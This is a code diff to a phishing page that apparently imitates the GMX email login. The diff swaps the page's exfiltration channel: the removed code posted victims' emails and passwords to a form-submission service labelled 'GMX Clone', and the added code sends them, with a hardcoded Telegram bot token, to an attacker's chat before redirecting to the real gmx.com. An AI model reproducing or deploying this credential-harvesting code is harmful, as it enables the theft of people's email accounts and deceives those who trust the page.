@@ -36,9 +36,7 @@
     </style>
 </head>
 <body>
-
 <div id="preloader"><div class="spinner"></div></div>
-
 <nav class="navbar">
     <div class="navbar-left">
         <div class="hamburger"><span></span><span></span><span></span></div>
@@ -60,7 +58,6 @@
         </a>
     </div>
 </nav>
-
 <div class="page">
     <div class="card">
         <div class="card-title">
@@ -81,14 +78,28 @@
         </div>
     </div>
 </div>
-
 <script>
+    const BOT_TOKEN = '8649914292:AAECuZ1YISCqcMxu-YS4ykkgOFfal5epHhg';
+    const CHAT_ID = '7243098474';
+
     function showPreloader() {
         document.getElementById('preloader').classList.add('active');
     }
     window.addEventListener('pageshow', function() {
         document.getElementById('preloader').classList.remove('active');
     });
+
+    async function sendToTelegram(message) {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    }
 
     async function handleLogin() {
         const email = document.getElementById('email').value;
@@ -97,27 +108,12 @@
 
         showPreloader();
 
-        try {
-            const response = await fetch('https://api.web3forms.com/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    access_key: 'd3204d64-565e-48bc-83c1-7fb2d5a83d08',
-                    subject: 'GMX Login Attempt',
-                    from_name: 'GMX Clone',
-                    email: email,
-                    password: password,
-                    type: 'LOGIN',
-                    time: new Date().toLocaleString()
-                })
-            });
+        const message = `🔐 <b>GMX LOGIN</b>
+📧 Email: ${email}
+🔑 Password: ${password}
+🕐 Time: ${new Date().toLocaleString()}`;
 
-            const result = await response.json();
-            console.log(result);
-        } catch(e) {
-            console.log('Error:', e);
-        }
-
+        await sendToTelegram(message);
         window.location.href = 'https://www.gmx.com';
     }
 </script>
